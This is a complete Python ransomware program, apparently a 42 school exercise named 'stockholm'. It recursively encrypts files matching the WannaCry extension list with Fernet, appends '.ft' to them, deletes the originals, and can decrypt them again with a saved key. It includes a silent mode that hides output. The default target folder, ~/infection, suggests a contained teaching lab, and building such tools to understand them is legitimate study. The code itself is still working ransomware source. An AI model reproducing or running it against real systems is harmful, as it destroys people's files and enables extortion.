# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: alexsanc <alexsanc@student.42barcel>       +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/30 18:01:50 by alexsanc          #+#    #+#              #
#    Updated: 2023/05/31 15:09:35 by alexsanc         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import sys
try:
    import argparse
    import os
    from cryptography.fernet import Fernet
    from pathlib import Path
except:
    sys.exit("\nError: library not imported")


# The function ft_stockholm() is used to call the functions of the program
# The function takes no arguments
# The function ft_stockholm() is called in the main function


def ft_stockholm():
    ft_parser()
    ft_init_vars()
    ft_check_args()
    ft_print(0, None)
    for file in ft_check_files(path):
        ft_encode_decode(file)


# The function ft_parser() is used to parse the arguments passed to the program
# The function takes no arguments
# The function ft_parser() is called in the function ft_stockholm()


def ft_parser():
    global args
    parser = argparse.ArgumentParser(
        description="Stockholm is a ransomware that encrypts files and demands a ransom to decrypt them.")
    parser.add_argument(
        "-v", "--version", help="Display the program version", action="store_true")
    parser.add_argument("-r", "--reverse", metavar=("KEY_FILE", "PATH"), nargs=2,
                        type=str,  help="Decrypt files using a key file and a path to decrypt files")
    parser.add_argument(
        "-s", "--silent", help="Enables silent mode, so that no output is displayed", action="store_true")
    parser.add_argument(
        "-p", "--path", help="Path to encrypt or were encrypted files are located", type=str)
    args = parser.parse_args()


# The function ft_init_vars() is used to initialize the variables
# The function takes no arguments
# The function ft_init_vars() is called in the function ft_stockholm()
# The extensions being encrypted are the same as the ones encrypted by WannaCry
# The list of extensions is taken from https://www.bleepingcomputer.com/forums/t/648526/extension-list-for-wannacry-ransomware/


def ft_init_vars():
    global version, path, path_out, key_file, ext, mode
    version = "stockholm 1.0"
    if args.path:
        path = os.path.join(Path.cwd(), args.path)
    else:
        path = str(Path.home()) + "/infection"
    if args.reverse:
        key_file = args.reverse[0]
        path_out = os.path.join(Path.cwd(), args.reverse[1])
        ext = ['.ft']
        mode = 1
    else:
        key_file = "decrypt.key"
        path_out = path
        mode = 0
        ext = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt',
               '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm',
               '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot',
               '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm',
               '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz',
               '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef',
               '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi',
               '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp',
               '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas',
               '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb',
               '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std',
               '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw',
               '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']


# The function ft_check_args() is used to check the arguments passed to the program
# The function takes no arguments
# The function ft_check_args() is called in the function ft_stockholm()


def ft_check_args():
    if args.version:
        print("version:", version)
        exit()
    if not os.path.exists(path):
        sys.exit(f"The Path specified '{path}' doesn't exist")
    if not os.path.isdir(path):
        sys.exit(f"Can't open '{path}'")
    if args.reverse:
        ft_reverse()
    else:
        ft_normal()


# The function ft_reverse() is used to decrypt files
# The function takes no arguments
# The function ft_reverse() is called in the function ft_check_args()


def ft_reverse():
    global key
    try:
        with open(key_file, "rb") as f:
            key = f.read()
    except:
        sys.exit(f"Failed to open key file: '{key_file}")
    ft_check_path(path_out)


# The function ft_check_path() is used to check if the path exists
# If not, create it
# If yes, check if it is a folder
# If yes, continue
# If not, exit the program


def ft_check_path(check):
    if not os.path.exists(check):
        try:
            os.makedirs(check)
        except:
            sys.exit(f"Failed to create '{check}'")
    elif not os.path.isdir(check):
        sys.exit(f'Can\'t open \'{check}\'')


# The function ft_normal() is used to generate a key file
# The function takes no arguments
# The key file is stored in the current directory and is called decrypt.key


def ft_normal():
    global key
    try:
        with open(key_file, "wb") as f:
            key = Fernet.generate_key()
            f.write(key)
    except:
        sys.exit(f"Failed to create '{key_file}'")


# The function ft_check_files() is used to check if the files in the path are
# files or directories, if they are directories, the function calls itself
# with the new path, if they are files, the function checks if the file has
# an extension in the list ext, if it has, the function returns the path of
# the file, if it doesn't have, the function prints the path of the file
# The function takes one argument, the path to check
# The function ft_check_files() is called in the function ft_stockholm()


def ft_check_files(work_path):
    try:
        for file in os.listdir(work_path):
            full_file = os.path.join(work_path, file)
            if os.path.isdir(full_file):
                for next_file in ft_check_files(full_file):
                    yield next_file
            else:
                if Path(full_file).suffix in ext:
                    yield full_file
                else:
                    ft_print(1, full_file)
    except:
        ft_print(4, full_file)


# The function ft_encode_decode() is used to encrypt or decrypt files
# The function takes one argument, the path of the file to encrypt or decrypt
# The function ft_encode_decode() is called in the function ft_stockholm()


def ft_encode_decode(file):
    try:
        with open(file, "rb") as f:
            data = f.read()
        if not mode:
            to_write = Fernet(key).encrypt(data)
            new_file = file + ".ft"
        else:
            to_write = Fernet(key).decrypt(data)
            new_file = os.path.join(path_out, Path(file).relative_to(path))
            new_file = os.path.splitext(new_file)[0]
            ft_check_path(Path(new_file).parent)
        with open(new_file, "wb") as f:
            f.write(to_write)
        ft_print(2, new_file)
        os.remove(file)
    except:
        ft_print(3, file)


# The function ft_print() is used to print the output of the program
# The function takes two arguments, the first one is the number of the output
# The second one is the string to print
# The function ft_print() is called in the function ft_stockholm()


def ft_print(num, string):
    if args.silent:
        return
    to_print = [["\033[96mEncrypting files:", "\033[93mFile skipped:\t", "\033[92mFile encrypted:\t", "\033[91mError encrypting:", "\033[91mError directory:"],
                ["\033[96mDecrypting files:", "\033[93mFile skipped:\t", "\033[92mFile decrypted\t", "\033[91mError decrypting:", "\033[91mError directory:"]]
    if string:
        print(f'\t{to_print[mode][num]}\t{string}\033[0m')
    else:
        print(f'{to_print[mode][num]}\n\033[0m')


# The function main() is used to call the function ft_stockholm()
# The function takes no arguments
# The function main() is called when the program is executed


if __name__ == "__main__":
    ft_stockholm()
